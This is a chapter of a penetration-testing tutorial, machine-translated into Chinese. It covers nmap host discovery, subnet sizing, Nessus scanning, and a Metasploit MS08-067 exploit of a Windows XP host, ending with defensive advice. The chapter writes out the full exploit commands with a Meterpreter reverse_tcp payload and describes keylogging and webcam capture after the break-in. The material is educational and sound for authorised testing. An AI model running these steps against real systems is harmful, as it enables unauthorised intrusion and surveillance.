# 五、接入网络

第五章到了！在本章中，我们将讨论与您作为无线渗透测试仪访问网络相关的几个主题。我们将在网络上运行评估，以识别主机、确定网络大小并检测主机的漏洞。在进行 pentest 时，最好知道网络上有多少台主机，因为您不想在渗透测试中遗漏任何内容。让我们从讨论为什么这很重要开始这一章。

在本章中，我们将讨论以下主题：

*   识别主机
*   确定网络大小
*   检测易受攻击的主机
*   防止威胁

如果网络上有运行 Windows 2000 或 XP 的客户端，我们需要知道。用户完全意识到他们正处于风险之中，因为他们使用的是较旧版本的 Windows 操作系统。Windows XP 可能在几分钟内被破坏！截至 2014 年 4 月，微软放弃了对 Windows XP 的支持。Windows XP 不再受支持，这意味着此版本的操作系统将吸引许多攻击者搜索漏洞。这背后的原因很简单，因为 Microsoft 不会再发布任何安全修补程序，因此如果攻击者在系统中发现漏洞，它将始终处于易受攻击状态。

我们将使用多种网络工具来确定网络上有多少台主机、主机的操作系统版本、网络大小以及易受攻击的主机。了解网络上的漏洞，然后提供安全补丁或更新，将有助于加强安全性。请记住，您不仅需要知道哪些系统和设备易受攻击，还需要知道组织中的用户！

这可能是我所看到的最大的安全威胁之一。您的员工需要接受安全意识计划，以了解什么是好的，什么是坏的，什么是应该做的，什么是不应该做的。您也可以让员工在工作之外共享客户信息，以获取潜在收益。留意任何你认为会损害业务的可疑活动。

# 识别主机

本部分介绍了可用于识别网络上主机的各种工具。这些工具将提供有关用户 IP 地址、MAC 地址、开放和关闭端口、服务、操作系统等的详细信息。在以下部分中，您可以看到 Kali Linux 提供的一系列工具，这些工具可以帮助识别网络上的主机。

## 网络映射工具

我们将通过命令行界面关注 Nmap。以下是一些可用于绘制网络图的替代工具：

*   0trace
*   愤怒的 IP 扫描器
*   hping2 和 hping3
*   lanmap 和 lanmap2
*   TCP 跟踪路由

在本演示中，您将学习如何使用 Nmap 识别网络上的主机。到目前为止，当涉及到网络发现或需要知道网络服务是否正在运行（如 Telnet、SSH 或 FTP）时，这些工具是我的最爱。开始吧！

1.  打开终端。
2.  Type the following command and press *Enter*:

    ```
    ifconfig

    ```

    正如您在下面的屏幕截图中所看到的，我的私有 IP 地址是`192.168.1.5`。我的网关正好是`192.168.1.1`，所以我接下来将向您展示如何扫描整个子网。

    ![Network mapping tools](graphics/3183OS_05_01.jpg)

3.  Type the following command and press *Enter*:

    ```
    nmap 192.168.X.0/24

    ```

    此命令将在`192.168.1.1`至`192.168.1.254`的所有主机上启动 ping 扫描。当您收到输出时，您会注意到一些有趣的信息，例如打开和关闭的端口、服务以及它们正在运行的操作系统。

    如果主机感染了 Conflicker，这也是一种很好的技术。要做到这一点，您需要学习一些 Nmap 的命令行开关。

    正如您在下面的屏幕截图中所看到的，我能够在本地网络上检测到多个系统和设备：

    ![Network mapping tools](graphics/3183OS_05_02.jpg)

    您可以看到我的 Cisco 无线路由器和打开并过滤的端口：

    ![Network mapping tools](graphics/3183OS_05_03.jpg)

4.  If you happen to have a firewall on the network, you need to run the following command:

    ```
    nmap –PN 192.168.X.0/24

    ```

    此命令将所有主机视为联机，并跳过主机发现。它用于绕过防火墙的常见过滤器，以确定防火墙是否在线，如以下屏幕截图所示：

    ![Network mapping tools](graphics/3183OS_05_04.jpg)

# 确定网络规模

确定网络大小并不困难。如果你碰巧有一些人际网络方面的经验，这就容易多了。我将提供关于如何确定网络大小和主机估计数量的几个步骤。开始吧！

## 在 Kali Linux 中确定网络大小

在这个演示中，我们将确定 Kali Linux 中的网络大小。执行以下步骤：

1.  打开终端。
2.  Type the following command and press *Enter*:

    ```
    ifconfig | grep Mask

    ```

    以下是输出：

    ![Determining the network size in Kali Linux](graphics/3183OS_05_05.jpg)

您需要上下滚动以导航到您的网络配置。子网掩码在前面的屏幕截图中显示为`255.255.255.0`。如果我们通过做一些子网数学来计算，我们可以确定这个网络的主机可能在 1 到 254 之间。

您可能会问自己，网络规模的确定与渗透测试有什么关系？确定网络大小有助于渗透测试人员获得网络上主机的估计数量。当知道数据中心或大学校园等网络的数量时，这有助于简化渗透测试。

# 检测易受攻击的主机

这一节非常简单。如果你碰巧认识一个不每天更新系统的人，他们很可能会受到最新的安全威胁。到目前为止，Windows XP 是非常不安全的，特别是如果用户的系统上没有安装任何更新或 service Pack。在下一个演示中，我将向您展示 Windows XP 中的漏洞。由于我手头没有 Windows 7 或 8 的有效副本，因此无法演示这些操作系统。

让我们执行以下步骤：

1.  Scan the target to see the services running:

    ![Detecting vulnerable hosts](graphics/3183OS_05_06.jpg)

    此命令启用操作系统检测、版本检测、脚本扫描和跟踪路由。

2.  使用 Nessus 扫描漏洞。

    ### 注

    如果您是第一次运行尼索斯请注意，您需要先注册尼索斯

3.  In the following screenshot, you'll see that we provided the IP address of the host we are going to scan for vulnerabilities. The host is running Windows XP Professional Service Pack 3.

    ![Detecting vulnerable hosts](graphics/3183OS_05_07.jpg)

4.  As shown in the following screenshot, we are now ready to click on **Launch** to start our scan with Nessus:

    ![Detecting vulnerable hosts](graphics/3183OS_05_08.jpg)

5.  After the scan has finished, we need to analyze the report:

    ![Detecting vulnerable hosts](graphics/3183OS_05_09.jpg)

6.  As you can see in our results, there are several vulnerable services:

    ![Detecting vulnerable hosts](graphics/3183OS_05_10.jpg)

    如果您选择其中一个并查看插件的名称，它会显示`MS08-067`。我们将在稍后使用它来发现我们的漏洞。

7.  Let's begin to search for our exploit. Start a new Metasploit console using the following command:

    ```
    msfconsole

    ```

    出现以下屏幕：

    ![Detecting vulnerable hosts](graphics/3183OS_05_11.jpg)

    ### 注

    Metasploit 框架可从[下载 http://www.rapid7.com/products/metasploit/download.jsp](http://www.rapid7.com/products/metasploit/download.jsp) 。Metasploit 框架是 H.D.Moore 在 2003 年开发的一个开源攻击框架。它用于入侵系统和设备进行测试。它为进行渗透测试、IDS 签名开发和利用漏洞研究的人员提供信息。

8.  To search for our exploit, type the following:

    ```
    search ms08

    ```

    以下是输出：

    ![Detecting vulnerable hosts](graphics/3183OS_05_12.jpg)

9.  键入所有这些命令：

    *   `use exploit/windows/smb/ms08_067_netapi`：此命令将 Metasploit 框架设置为使用漏洞`ms08_067_netapi`
    *   `set RHOST 192.168.1.30`：此命令将远程主机设置为您正在利用的用户
    *   `set PAYLOAD windows/meterpreter/reverse_tcp`：此命令将有效负载设置为`reverse_tcp`因此，我们可以在攻击成功后连接回主机
    *   `set LHOST 192.16``8.1.5`：此命令设置本地主机，即 Kali Linux 主机的 IP 地址
    *   `exploit`：此命令实时启动攻击，以便您可以看到操作中的详细信息

10.  If you would like to run a different payload, use the command:

    ```
    show payloads

    ```

    在下面的屏幕截图中，我们可以看到前面输入的命令的输出：

    ![Detecting vulnerable hosts](graphics/3183OS_05_13.jpg)

    如果操作正确，我们应该有一个流量计外壳：

    ![Detecting vulnerable hosts](graphics/3183OS_05_14.jpg)

MeterMeter 外壳在您和被利用主机之间是一个完全独立的环境。它不需要运行，但它更像是一个概念证明，而不是其他任何东西。您可以执行程序、批处理脚本；浏览系统层次结构、哈希转储、网络配置；甚至可以从网络摄像机上拍摄快照。那么，如果有人能在你身上安装一个流量计，会发生什么呢？他们可以创建系统的后门并获得管理权。

祝贺我们已成功检测并利用无线网络上的易受攻击主机。从这里，我们可以查看目标系统上正在运行的进程、截图、记录击键，甚至可以查看连接的网络摄像头。流量计是一种非常强大的外壳。一定要花点时间好好看看。

![Detecting vulnerable hosts](graphics/3183OS_05_15.jpg)

# 防范威胁

我们总是需要知道如何保护自己免受这些威胁和攻击。接下来，我将讨论如何保护自己免受这些攻击。

## 防止主机识别

为了保护自己免受威胁和风险，小型和大型企业都应该有一个硬件防火墙，如 WatchGuard XTM 或 Cisco ASA，带有自定义规则来阻止未使用的服务和端口。还应从服务器或网络设备禁用未使用的服务，以防止任何未经授权的访问。启用短信或电子邮件警报的入侵检测系统。防火墙应该记录协议和标记警报。

如果防火墙或 ID 未被监控，那么您如何知道您的组织是否受到威胁？日常监控对于在外部网络上发现的威胁和风险保持领先非常重要。使用 VLAN 将网络彼此隔离。服务器、工作站、VoIP 和无线应具有自己的 VLAN，以使网络与网络感染和危害隔离。

## 阻止他人确定您的网络规模

在确定网络规模时，应始终加密任何敏感信息，如网络图、密码、日志、工作站和服务器信息以及配置设置。硬件防火墙（如 WatchGuard XTM 或 Cisco ASA）对于小型和大型企业来说都是一个很好的选择，可以通过阻止 ICMP 和只允许来自可信来源的流量来控制流量。

## 易受攻击主机的保护

为保护您的系统和网络设备免受攻击，请安装供应商提供的最新安全补丁。在最新的操作系统和软件更新可用时安装它们。如果升级时遇到冲突，请向软件供应商报告问题。使用具有复杂密码短语的最强无线加密 WPA2 和 AES 加密算法。在所有工作站和服务器上运行带有最新病毒定义的实时防病毒扫描程序。为员工提供安全意识培训。

# 总结

哇！我们在本章中完成了三个演示！我希望你和我一样喜欢这些演示。这一章对我们俩来说都很有趣。让我们花些时间回顾一下你学到的东西。

在本章中，我们讨论了在网络上进行渗透测试时，查找活动主机数量的重要性。接下来，我们演示了如何使用 Kali Linux 识别网络上的主机。然后，我们演示了如何确定网络大小，并解释了作为渗透测试人员理解这一点的重要性。我们通过演示如何使用 Nessus 漏洞扫描程序检测 Windows XP 中的漏洞来完成本章，并列出了一些有助于降低风险的预防措施。

在下一章中，我们将介绍如何规划漏洞评估、配置 Nessus 漏洞扫描程序、运行 Nessus 漏洞扫描程序以及修补漏洞。我很确定你和我一样兴奋。让我们进入下一章！